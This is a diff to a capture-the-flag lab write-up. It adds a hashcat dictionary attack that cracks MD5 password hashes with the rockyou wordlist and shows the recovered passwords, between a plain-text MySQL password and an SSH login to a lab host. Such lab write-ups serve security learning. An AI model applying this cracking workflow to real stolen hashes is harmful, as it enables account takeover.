@@ -275,6 +275,16 @@ Access MySQL databases, password for mysql `Ng1-f3!Pe7-e5?Nf3xe5`
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/a45f7248-a301-447a-8765-b8afc5df40e5)
 
+Or use hashcat `hashcat -a 0 -m 0 hash wordlist --show`
+
+    ┌──(kali㉿kali)-[~/wordlist]
+    └─$ hashcat -a 0 -m 0 ../Desktop/hash.txt rockyou.txt --show
+    2ac9cb7dc02b3c0083eb70898e549b63:Password1
+    0d107d09f5bbe40cade3de5c71e9e9b7:letmein
+    d5c0607301ad5d5c1528962a83992ac8:sunshine1
+    4a04890400b5d7bac101baace5d7e994:sandwich
+
+
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/f109e467-345b-467f-b7a3-f540f0b64851)
 
 `ssh claire-r@10.10.5.167`
